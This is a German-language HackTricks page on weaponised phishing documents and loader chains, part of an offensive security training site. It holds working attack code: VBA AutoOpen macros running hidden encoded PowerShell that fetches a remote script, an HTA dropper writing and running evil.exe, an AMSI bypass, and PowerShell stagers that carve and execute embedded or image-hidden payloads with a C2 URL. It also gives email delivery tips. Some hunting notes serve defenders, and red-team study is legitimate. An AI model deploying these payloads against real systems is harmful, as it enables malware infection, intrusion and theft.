# Phishing-Dateien & Dokumente

{{#include ../../banners/hacktricks-training.md}}

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Validierung der Dateidaten durch. Die Validierung erfolgt in Form einer Identifizierung der Datenstruktur anhand des OfficeOpenXML-Standards. Tritt bei der Identifizierung der Datenstruktur ein Fehler auf, wird die analysierte Datei nicht geöffnet.

Normalerweise verwenden Word-Dateien mit Macros die Erweiterung `.docm`. Es ist jedoch möglich, die Datei umzubenennen, indem die Dateierweiterung geändert wird, und dennoch ihre Fähigkeiten zur Macro-Ausführung beizubehalten.\
Zum Beispiel unterstützt eine RTF-Datei von Haus aus keine Macros, aber eine in RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und kann Macros ausführen.\
Dieselben Interna und Mechanismen gelten für alle Programme der Microsoft Office Suite (Excel, PowerPoint usw.).

Du kannst den folgenden Befehl verwenden, um zu prüfen, welche Erweiterungen von einigen Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine entfernte Vorlage verweisen (File –Options –Add-ins –Manage: Templates –Go), die Makros enthält, können Makros ebenfalls „ausführen“.

### External Image Load

Gehe zu: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![Office Documents - External Image Load: Go to: Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload functions

Je häufiger sie sind, desto wahrscheinlicher erkennt AV sie.

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

Fo to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**.

#### Doc Extension

When finished, select **Save as type** dropdown, change the format from **`.docx`** to **Word 97-2003 `.doc`**.\
Do this because you **can't save macro's inside a `.docx`** and there's a **stigma** **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## LibreOffice ODT auto-run macros (Basic)

LibreOffice Writer documents can embed Basic macros and auto-execute them when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document → Macro…). A simple reverse shell macro looks like:
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Beachten Sie die doppelten Anführungszeichen (`""`) innerhalb des Strings – LibreOffice Basic verwendet sie, um literale Anführungszeichen zu escapen, sodass Payloads, die mit `...==""")` enden, sowohl den inneren Befehl als auch das `Shell`-Argument ausgewogen halten.

Lieferhinweise:

- Als `.odt` speichern und das Makro an das Dokumentereignis binden, damit es sofort beim Öffnen ausgelöst wird.
- Beim Versenden per E-Mail mit `swaks` `--attach @resume.odt` verwenden (das `@` ist erforderlich, damit die Datei-Bytes und nicht der Dateiname als Anhang gesendet werden). Dies ist kritisch beim Missbrauch von SMTP-Servern, die beliebige `RCPT TO`-Empfänger ohne Validierung akzeptieren.

## HTA Files

Ein HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript)** kombiniert. Es erzeugt die Benutzeroberfläche und wird als "fully trusted" Anwendung ausgeführt, ohne die Einschränkungen des Sicherheitsmodells eines Browsers.

Ein HTA wird mit **`mshta.exe`** ausgeführt, das typischerweise zusammen mit **Internet Explorer** **installiert** wird, wodurch **`mshta`** von IE abhängt. Wenn es also deinstalliert wurde, können HTAs nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM-Authentifizierung erzwingen

Es gibt mehrere Möglichkeiten, **NTLM-Authentifizierung "remote" zu erzwingen**, zum Beispiel könntest du **unsichtbare Bilder** in E-Mails oder HTML einfügen, auf die der Benutzer zugreift (sogar HTTP MitM?). Oder dem Opfer die **Adresse von Dateien** senden, die bei **einfachen Öffnen des Ordners** eine **Authentifizierung** auslösen.

**Sieh dir diese Ideen und mehr auf den folgenden Seiten an:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

Vergiss nicht, dass du nicht nur den Hash oder die Authentifizierung stehlen kannst, sondern auch **NTLM relay attacks** durchführen kannst:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

Hocheffektive Kampagnen liefern eine ZIP, die zwei legitime Lockvogel-Dokumente (PDF/DOCX) und eine bösartige .lnk enthält. Der Trick besteht darin, dass der eigentliche PowerShell-Loader innerhalb der rohen ZIP-Bytes hinter einem eindeutigen Marker gespeichert ist und die .lnk ihn vollständig im Speicher herauslöst und ausführt.

Typischer Ablauf, implementiert durch die .lnk PowerShell one-liner:

1) Die ursprüngliche ZIP in gängigen Pfaden finden: Desktop, Downloads, Documents, %TEMP%, %ProgramData% und der Parent des aktuellen Arbeitsverzeichnisses.
2) Die ZIP-Bytes lesen und einen fest codierten Marker finden (z. B. xFIQCV). Alles nach dem Marker ist die eingebettete PowerShell-Payload.
3) Die ZIP nach %ProgramData% kopieren, dort extrahieren und die Lockvogel-.docx öffnen, um legitim zu wirken.
4) AMSI für den aktuellen Prozess umgehen: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Die nächste Stage deobfuszieren (z. B. alle # Zeichen entfernen) und im Speicher ausführen.

Beispiel-PowerShell-Skeleton, um die eingebettete Stage herauszulösen und auszuführen:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notizen
- Die Zustellung missbraucht oft vertrauenswürdige PaaS-Subdomains (z. B. *.herokuapp.com) und kann Payloads gaten (liefert harmlose ZIPs basierend auf IP/UA aus).
- Die nächste Stufe entschlüsselt häufig base64/XOR shellcode und führt ihn via Reflection.Emit + VirtualAlloc aus, um Disk-Artefakte zu minimieren.

Persistence, die in derselben Kette verwendet wurde
- COM TypeLib hijacking des Microsoft Web Browser controls, sodass IE/Explorer oder jede App, die es einbettet, die Payload automatisch erneut startet. Details und sofort nutzbare Befehle hier:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP-Dateien, die die ASCII-Markierungszeichenfolge (z. B. xFIQCV) enthalten, die an die Archivdaten angehängt ist.
- .lnk, das Parent-/User-Ordner enumeriert, um das ZIP zu finden, und ein Decoy-Dokument öffnet.
- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Langlaufende Business-Threads, die mit Links enden, die unter vertrauenswürdigen PaaS-Domains gehostet sind.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Ein weiteres wiederkehrendes Muster ist eine **document-impersonating `.lnk`**, die sofort einen harmlosen Köder öffnet, während sie die echte Kette im Hintergrund staged.

Beobachteter Ablauf:
1. Der Shortcut **gibt sich als PDF aus** und nutzt `conhost.exe` oder einen ähnlichen Proxy, um einen obfuskierten PowerShell-Downloader zu starten.
2. Die PowerShell fragmentiert offensichtliche Tokens (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`), sodass naive Detektionen nach `iwr`, `gci`, `ren`, `cpi` oder `schtasks` den Command verpassen.
3. Der Stager lädt **zuerst das Decoy-Dokument** herunter, öffnet es für das Opfer und rekonstruiert dann im Hintergrund die malicious Files.
4. Payloads können mit **junk extensions** geschrieben und dann durch Entfernen der Füllzeichen umbenannt werden, wodurch das Auftauchen offensichtlicher `.exe` / `.cpl`-Artefakte verzögert wird.
5. Persistence wird mit einer **minute-based scheduled task** etabliert, die ein vertrauenswürdiges Host-Binary von einem user-writable path startet.

Minimale Hunting-Hinweise aus diesem Muster:
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Eine nützliche Staging-Layout, das man erkennen sollte, ist:
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` or `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Warum die zweite Stufe stealthy ist

In der Rapid7-Fallstudie startete der geplante Task wiederholt **`Fondue.exe`** aus `C:\Users\Public\`. Da **`APPWIZ.cpl`** direkt daneben abgelegt war und **`RunFODW`** exportierte, lud die vertrauenswürdige Microsoft-Binärdatei das Angreifer-CPL statt der legitimen Systemkopie per Side-Loading.

Die CPL dann:
- Liest einen **AES-256-CBC**-Blob aus `C:\Windows\Tasks\editor.dat`
- Entschlüsselt ihn über **Windows CNG / `bcrypt.dll`**
- Reserviert ausführbaren Speicher und kopiert das entschlüsselte Shellcode hinein
- Führt ihn indirekt aus, indem sie den Shellcode-Pointer als Callback für **`EnumUILanguagesW`** übergibt

Dieser letzte Schritt ist separat sehenswert: Malware vermeidet oft einen direkten `((void(*)())buf)()`-Sprung und missbraucht stattdessen eine **legitime WinAPI, die Callbacks annimmt**, um die Ausführung zu übertragen.

Das entschlüsselte Payload in dieser Kampagne war **Donut**-Shellcode, der dann das finale PE vollständig im Speicher mapte und **AMSI/WLDP/ETW** im aktuellen Prozess patchte, bevor er die Ausführung übergab. Für tiefere Notizen zu Side-Loading und speicherresidenter Nachbearbeitung, siehe:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Praktische Hunting-Pivots:
- `.lnk`, die `powershell.exe` oder `conhost.exe` startet, gefolgt von einem sichtbaren Decoy-Dokument.
- Kurzlebige Downloads nach **`C:\Users\Public\`** gefolgt von sofortigen Umbenennungen mit Unsinns-Extensions.
- Geplante Tasks mit unscheinbaren Namen wie `GoogleErrorReport`, die aus **user-writable directories** ausgeführt werden.
- Vertrauenswürdige Binärdateien, die **`.cpl` / `.dll`**-Dateien aus demselben nicht-systemischen Verzeichnis laden.
- Base64-Textblobs, die unter **`C:\Windows\Tasks\`** geschrieben und dann von dem side-loaded Modul gelesen werden.

## Steganography-delimited Payloads in Bildern (PowerShell stager)

Aktuelle Loader-Ketten liefern ein obfuskiertes JavaScript/VBS, das einen Base64-PowerShell-stager dekodiert und ausführt. Dieser stager lädt ein Bild herunter (oft GIF), das eine Base64-codierte .NET DLL enthält, die als Klartext zwischen eindeutigen Start/End-Markern versteckt ist. Das Skript sucht nach diesen Delimitern (in freier Wildbahn beobachtete Beispiele: «<<sudo_png>> … <<sudo_odt>>>»), extrahiert den Text dazwischen, Base64-dekodiert ihn zu Bytes, lädt die Assembly im Speicher und ruft eine bekannte Einstiegsmethode mit der C2-URL auf.

Workflow
- Stage 1: Archivierter JS/VBS dropper → dekodiert eingebettetes Base64 → startet PowerShell stager mit -nop -w hidden -ep bypass.
- Stage 2: PowerShell stager → lädt Bild herunter, schneidet marker-delimited Base64 heraus, lädt die .NET DLL im Speicher und ruft ihre Methode auf (z. B. VAI), wobei die C2-URL und Optionen übergeben werden.
- Stage 3: Loader holt das finale Payload und injiziert es typischerweise via process hollowing in eine vertrauenswürdige Binärdatei (häufig MSBuild.exe). Mehr über process hollowing und trusted utility proxy execution hier:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell-Beispiel, um eine DLL aus einem Bild herauszuschneiden und eine .NET-Methode im Speicher aufzurufen:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notizen
- Das ist ATT&CK T1027.003 (Steganography/Marker-Hiding). Marker variieren zwischen Kampagnen.
- AMSI/ETW Bypass und String-Deobfuscation werden üblicherweise vor dem Laden der Assembly angewendet.
- Hunting: gescannte heruntergeladene Bilder nach bekannten Delimitern; identifiziere PowerShell, das auf Bilder zugreift und sofort Base64-Blobs dekodiert.

Siehe auch Stego-Tools und Carving-Techniken:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS Droppers → Base64 PowerShell Staging

Eine wiederkehrende Initialstufe ist eine kleine, stark obfuskierte `.js`- oder `.vbs`-Datei, die in einem Archiv geliefert wird. Ihr einziger Zweck ist es, einen eingebetteten Base64-String zu dekodieren und PowerShell mit `-nop -w hidden -ep bypass` zu starten, um die nächste Stufe über HTTPS zu bootstrappen.

Skeleton-Logik (abstrakt):
- Eigene Dateiinhalte lesen
- Einen Base64-Blob zwischen Junk-Strings finden
- Zu ASCII-PowerShell dekodieren
- Mit `wscript.exe`/`cscript.exe` ausführen, das `powershell.exe` aufruft

Hunting-Hinweise
- Archivierte JS/VBS-Anhänge, die `powershell.exe` mit `-enc`/`FromBase64String` in der Command Line starten.
- `wscript.exe`, das `powershell.exe -nop -w hidden` aus User-Temp-Pfaden startet.

## Windows-Dateien, um NTLM-Hashes zu stehlen

Siehe die Seite über **Orte, um NTLM-Creds zu stehlen**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Rapid7 – Malware à la Mode: Tracking Dropping Elephant Tradecraft Through a China-Themed Loader Chain](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
